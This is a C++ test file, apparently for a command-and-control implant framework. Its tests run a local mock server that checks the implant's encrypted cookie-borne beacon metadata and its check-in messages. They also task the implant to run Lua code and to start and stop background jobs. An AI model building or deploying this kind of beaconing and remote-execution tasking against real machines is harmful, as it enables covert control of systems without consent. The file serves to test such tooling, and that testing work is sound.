#define CATCH_CONFIG_MAIN
#include <catch2/catch.hpp>

#include <chrono>
using namespace std::chrono_literals;

#include <server_http.hpp>
#include <util/zip.hpp>
#include <encryption.h>
#include <implant.h>
#include <metadata.h>
#include <message.h>

#include "scripts.h"

using HttpServer = SimpleWeb::Server<SimpleWeb::HTTP>;

TEST_CASE("none")
{
  monocypher::key_exchange server_keys;
  auto key_exchange_public_key = server_keys.get_public_key();
  std::vector<unsigned char> public_key;
  public_key.assign(key_exchange_public_key.begin(), key_exchange_public_key.end());
  auto server_public_key_base64 = util::base64::encode(public_key);

  HttpServer server;
  server.config.address = "127.0.0.1";
  server.config.port = 8123;
  int call = 1;

  server.default_resource["POST"] =
    [&](std::shared_ptr<HttpServer::Response> response, std::shared_ptr<HttpServer::Request> request) {

    auto it = request->header.find("Cookie");
    REQUIRE(it != request->header.end());
    REQUIRE(it->second.substr(0, it->second.find("=")) == "implant");
    std::vector<unsigned char> metadata_blob = util::base64::decode(util::url::decode(it->second.substr(8)));
    std::vector<uint8_t> metadata_msgpack = {};
    REQUIRE(encryption::decryptMetadata(metadata_blob, metadata_msgpack, server_keys.get_secret_key(), server_keys.get_public_key()));
    auto metadata = shared::metadata::deserialize(metadata_msgpack);
    REQUIRE(!metadata->id.empty());
    REQUIRE(!metadata->public_key.empty());

    if (call == 1) {
      REQUIRE(request->path == "/");

      // Receive initial hello message
      std::vector<uint8_t> data_blob = util::base64::decode(request->content.string());
      std::vector<uint8_t> data_msgpack = {};
      REQUIRE(encryption::decryptData(data_blob, data_msgpack, server_keys.get_secret_key(), metadata->public_key));
      REQUIRE(data_msgpack.size() > 0);
      auto data = shared::message::deserialize(data_msgpack);
      REQUIRE(data.size() == 1);
      REQUIRE(data.back()->type == "hello");

      // Send no messages
      response->write(SimpleWeb::StatusCode::success_no_content);
    }

    if (call == 2) {
      REQUIRE(request->path == "/");

      // Receive no messages back
      std::vector<uint8_t> data_blob = util::base64::decode(request->content.string());
      std::vector<uint8_t> data = {};
      REQUIRE(encryption::decryptData(data_blob, data, server_keys.get_secret_key(), metadata->public_key));
      REQUIRE(data.empty());

      response->write(SimpleWeb::StatusCode::success_no_content);
    }

    call++;
  };

  std::promise<unsigned short> server_port;
  std::thread server_thread([&server, &server_port]() {
    server.start([&server_port](unsigned short port) {
      server_port.set_value(port);
      });
    });
  server_port.get_future().wait();

  util::zip::zip_file file;
  file.write("init.lua", http_implant);
  std::vector<unsigned char> zip;
  file.save(zip);

  implant i("http://127.0.0.1:8123", server_public_key_base64, zip);
  std::future<void> it{ std::async(std::launch::async, [&i] { i.run(); }) };
  while (call < 3 && i.is_running()) {
    std::this_thread::sleep_for(100ms);
  }
  i.stop();
  it.wait();

  server.stop();
  server_thread.join();
  REQUIRE(call == 3);
}

TEST_CASE("hello")
{
  monocypher::key_exchange server_keys;
  auto key_exchange_public_key = server_keys.get_public_key();
  std::vector<unsigned char> public_key;
  public_key.assign(key_exchange_public_key.begin(), key_exchange_public_key.end());
  auto server_public_key_base64 = util::base64::encode(public_key);

  HttpServer server;
  server.config.address = "127.0.0.1";
  server.config.port = 8123;
  int call = 1;

  server.default_resource["POST"] =
    [&](std::shared_ptr<HttpServer::Response> response, std::shared_ptr<HttpServer::Request> request) {

    auto it = request->header.find("Cookie");
    REQUIRE(it != request->header.end());
    REQUIRE(it->second.substr(0, it->second.find("=")) == "implant");
    std::vector<unsigned char> metadata_blob = util::base64::decode(util::url::decode(it->second.substr(8)));
    std::vector<uint8_t> metadata_msgpack = {};
    REQUIRE(encryption::decryptMetadata(metadata_blob, metadata_msgpack, server_keys.get_secret_key(), server_keys.get_public_key()));
    auto metadata = shared::metadata::deserialize(metadata_msgpack);
    REQUIRE(!metadata->id.empty());
    REQUIRE(!metadata->public_key.empty());

    if (call == 1) {
      REQUIRE(request->path == "/");

      // Receive initial hello message
      std::vector<uint8_t> data_blob = util::base64::decode(request->content.string());
      std::vector<uint8_t> data_msgpack = {};
      REQUIRE(encryption::decryptData(data_blob, data_msgpack, server_keys.get_secret_key(), metadata->public_key));
      REQUIRE(data_msgpack.size() > 0);
      auto data = shared::message::deserialize(data_msgpack);
      REQUIRE(data.size() == 1);
      REQUIRE(data.back()->type == "hello");

      // Issue request for hello message
      std::vector<std::shared_ptr<shared::message>> v;
      v.push_back(std::make_shared<shared::message>("abcd0001", "hello", "", ""));
      auto task_msgpack = shared::message::serialize(v);

      std::vector<uint8_t> blob;
      encryption::encryptData(task_msgpack, blob, server_keys.get_secret_key(), metadata->public_key);

      SimpleWeb::CaseInsensitiveMultimap header{ {"Content-Type", "text/plain"} };
      response->write(util::base64::encode(blob.data(), blob.size()), header);
    }

    if (call == 2) {
      // Receive second hello message
      REQUIRE(request->path == "/");
      std::vector<uint8_t> data_blob = util::base64::decode(request->content.string());
      std::vector<uint8_t> data_msgpack = {};
      REQUIRE(encryption::decryptData(data_blob, data_msgpack, server_keys.get_secret_key(), metadata->public_key));
      auto data = shared::message::deserialize(data_msgpack);
      REQUIRE(data.size() == 1);
      REQUIRE(data[0]->id == "abcd0001");

      // Send no further messages
      response->write(SimpleWeb::StatusCode::success_no_content);
    }

    call++;
  };

  std::promise<unsigned short> server_port;
  std::thread server_thread([&server, &server_port]() {
    server.start([&server_port](unsigned short port) {
      server_port.set_value(port);
      });
    });
  server_port.get_future().wait();

  util::zip::zip_file file;
  file.write("init.lua", http_implant);
  std::vector<unsigned char> zip;
  file.save(zip);

  implant i("http://127.0.0.1:8123", server_public_key_base64, zip);
  std::future<void> it { std::async(std::launch::async, [&i] { i.run(); }) };
  while (call < 3 && i.is_running()) {
    std::this_thread::sleep_for(100ms);
  }
  i.stop();
  it.wait();

  server.stop();
  server_thread.join();
  REQUIRE(call == 3);
}

TEST_CASE("task")
{
  monocypher::key_exchange server_keys;
  auto key_exchange_public_key = server_keys.get_public_key();
  std::vector<unsigned char> public_key;
  public_key.assign(key_exchange_public_key.begin(), key_exchange_public_key.end());
  auto server_public_key_base64 = util::base64::encode(public_key);

  HttpServer server;
  server.config.address = "127.0.0.1";
  server.config.port = 8123;
  int call = 1;

  server.default_resource["POST"] =
    [&](std::shared_ptr<HttpServer::Response> response, std::shared_ptr<HttpServer::Request> request) {

    auto it = request->header.find("Cookie");
    REQUIRE(it != request->header.end());
    REQUIRE(it->second.substr(0, it->second.find("=")) == "implant");
    std::vector<unsigned char> metadata_blob = util::base64::decode(util::url::decode(it->second.substr(8)));
    std::vector<uint8_t> metadata_msgpack = {};
    REQUIRE(encryption::decryptMetadata(metadata_blob, metadata_msgpack, server_keys.get_secret_key(), server_keys.get_public_key()));
    auto metadata = shared::metadata::deserialize(metadata_msgpack);
    REQUIRE(!metadata->id.empty());
    REQUIRE(!metadata->public_key.empty());

    if (call == 1) {
      REQUIRE(request->path == "/");

      // Receive initial hello message
      std::vector<uint8_t> data_blob = util::base64::decode(request->content.string());
      std::vector<uint8_t> data_msgpack = {};
      REQUIRE(encryption::decryptData(data_blob, data_msgpack, server_keys.get_secret_key(), metadata->public_key));
      REQUIRE(data_msgpack.size() > 0);
      auto data = shared::message::deserialize(data_msgpack);
      REQUIRE(data.size() == 1);
      REQUIRE(data.back()->type == "hello");

      // Issue task
      std::vector<std::shared_ptr<shared::message>> v;
      v.push_back(std::make_shared<shared::message>("abcd0002", "task", "execute", "print(\"hello\")"));
      auto task_msgpack = shared::message::serialize(v);

      std::vector<uint8_t> blob;
      encryption::encryptData(task_msgpack, blob, server_keys.get_secret_key(), metadata->public_key);

      SimpleWeb::CaseInsensitiveMultimap header{ {"Content-Type", "text/plain"} };
      response->write(util::base64::encode(blob.data(), blob.size()), header);
    }

    if (call == 2) {
      // Receive task result
      REQUIRE(request->path == "/");
      std::vector<uint8_t> data_blob = util::base64::decode(request->content.string());
      std::vector<uint8_t> data_msgpack = {};
      REQUIRE(encryption::decryptData(data_blob, data_msgpack, server_keys.get_secret_key(), metadata->public_key));
      auto data = shared::message::deserialize(data_msgpack);
      REQUIRE(data.size() == 1);
      REQUIRE(data[0]->id == "abcd0002");
      REQUIRE(data[0]->type == "task");
      REQUIRE(data[0]->command == "execute");
      REQUIRE(data[0]->success);
      REQUIRE(data[0]->data == "hello\n");

      // Send no further messages
      response->write(SimpleWeb::StatusCode::success_no_content);
    }

    call++;
  };

  std::promise<unsigned short> server_port;
  std::thread server_thread([&server, &server_port]() {
    server.start([&server_port](unsigned short port) {
      server_port.set_value(port);
      });
    });
  server_port.get_future().wait();

  util::zip::zip_file file;
  file.write("init.lua", http_implant);
  std::vector<unsigned char> zip;
  file.save(zip);

  implant i("http://127.0.0.1:8123", server_public_key_base64, zip);
  std::future<void> it{ std::async(std::launch::async, [&i] { i.run(); }) };
  while (call < 3 && i.is_running()) {
    std::this_thread::sleep_for(100ms);
  }
  i.stop();
  it.wait();

  server.stop();
  server_thread.join();
  REQUIRE(call == 3);
}

TEST_CASE("jobs")
{
  monocypher::key_exchange server_keys;
  auto key_exchange_public_key = server_keys.get_public_key();
  std::vector<unsigned char> public_key;
  public_key.assign(key_exchange_public_key.begin(), key_exchange_public_key.end());
  auto server_public_key_base64 = util::base64::encode(public_key);

  HttpServer server;
  server.config.address = "127.0.0.1";
  server.config.port = 8123;
  int call = 1;
  std::string jobid;

  server.default_resource["POST"] =
    [&](std::shared_ptr<HttpServer::Response> response, std::shared_ptr<HttpServer::Request> request) {

    auto it = request->header.find("Cookie");
    REQUIRE(it != request->header.end());
    REQUIRE(it->second.substr(0, it->second.find("=")) == "implant");
    std::vector<unsigned char> metadata_blob = util::base64::decode(util::url::decode(it->second.substr(8)));
    std::vector<uint8_t> metadata_msgpack = {};
    REQUIRE(encryption::decryptMetadata(metadata_blob, metadata_msgpack, server_keys.get_secret_key(), server_keys.get_public_key()));
    auto metadata = shared::metadata::deserialize(metadata_msgpack);
    REQUIRE(!metadata->id.empty());
    REQUIRE(!metadata->public_key.empty());

    if (call == 1) {
      REQUIRE(request->path == "/");

      // Receive initial hello message
      std::vector<uint8_t> data_blob = util::base64::decode(request->content.string());
      std::vector<uint8_t> data_msgpack = {};
      REQUIRE(encryption::decryptData(data_blob, data_msgpack, server_keys.get_secret_key(), metadata->public_key));
      REQUIRE(data_msgpack.size() > 0);
      auto data = shared::message::deserialize(data_msgpack);
      REQUIRE(data.size() == 1);
      REQUIRE(data.back()->type == "hello");

      util::zip::zip_file file;
      file.write("init.lua", "local job = require \"job\"; while job.run() do end");
      std::vector<unsigned char> zip;
      file.save(zip);

      // Issue command to start a job
      auto w = shared::abstract::worker(
        "abcd0003",
        "Test Job",
        zip
      );
      std::vector<std::shared_ptr<shared::message>> vm;
      vm.push_back(std::make_shared<shared::message>(w.id(), "job_handler", "execute", shared::abstract::worker::serialize(w)));
      auto task_msgpack = shared::message::serialize(vm);

      std::vector<uint8_t> blob;
      encryption::encryptData(task_msgpack, blob, server_keys.get_secret_key(), metadata->public_key);

      SimpleWeb::CaseInsensitiveMultimap header{ {"Content-Type", "text/plain"} };
      response->write(util::base64::encode(blob.data(), blob.size()), header);
    }

    if (call == 2) {
      // Receive jobs result
      REQUIRE(request->path == "/");
      std::vector<uint8_t> data_blob = util::base64::decode(request->content.string());
      std::vector<uint8_t> data_msgpack = {};
      REQUIRE(encryption::decryptData(data_blob, data_msgpack, server_keys.get_secret_key(), metadata->public_key));
      auto data = shared::message::deserialize(data_msgpack);
      REQUIRE(data.size() == 1);
      REQUIRE(data[0]->id == "abcd0003");
      REQUIRE(data[0]->type == "job_handler");
      REQUIRE(data[0]->command == "executing");
      REQUIRE(data[0]->success);
      REQUIRE(data[0]->data.empty());

      // Issue command to stop job
      std::vector<std::shared_ptr<shared::message>> vm;
      vm.push_back(std::make_shared<shared::message>("abcd0005", "job_handler", "stop", "abcd0003"));
      auto task_msgpack = shared::message::serialize(vm);

      std::vector<uint8_t> blob;
      encryption::encryptData(task_msgpack, blob, server_keys.get_secret_key(), metadata->public_key);

      SimpleWeb::CaseInsensitiveMultimap header{ {"Content-Type", "text/plain"} };
      response->write(util::base64::encode(blob.data(), blob.size()), header);
    }

    if (call == 3) {
      // Receive jobs result
      REQUIRE(request->path == "/");
      std::vector<uint8_t> data_blob = util::base64::decode(request->content.string());
      std::vector<uint8_t> data_msgpack = {};
      REQUIRE(encryption::decryptData(data_blob, data_msgpack, server_keys.get_secret_key(), metadata->public_key));
      auto data = shared::message::deserialize(data_msgpack);
      REQUIRE(data.size() == 2);
      REQUIRE(data[0]->id == "abcd0005");
      REQUIRE(data[0]->type == "job_handler");
      REQUIRE(data[0]->command == "stopping");
      REQUIRE(data[0]->success);
      REQUIRE(data[1]->id == "abcd0005");
      REQUIRE(data[1]->type == "job_handler");
      REQUIRE(data[1]->command == "completed");
      REQUIRE(data[1]->success);

      // Send no further messages
      response->write(SimpleWeb::StatusCode::success_no_content);
    }

    call++;
  };

  std::promise<unsigned short> server_port;
  std::thread server_thread([&server, &server_port]() {
    server.start([&server_port](unsigned short port) {
      server_port.set_value(port);
      });
    });
  server_port.get_future().wait();

  util::zip::zip_file file;
  file.write("init.lua", http_implant);
  std::vector<unsigned char> zip;
  file.save(zip);

  implant i("http://127.0.0.1:8123", server_public_key_base64, zip);
  std::future<void> it{ std::async(std::launch::async, [&i] { i.run(); }) };
  while (call < 4 && i.is_running()) {
    std::this_thread::sleep_for(100ms);
  }
  i.stop();
  it.wait();

  server.stop();
  server_thread.join();
  REQUIRE(call == 4);
}
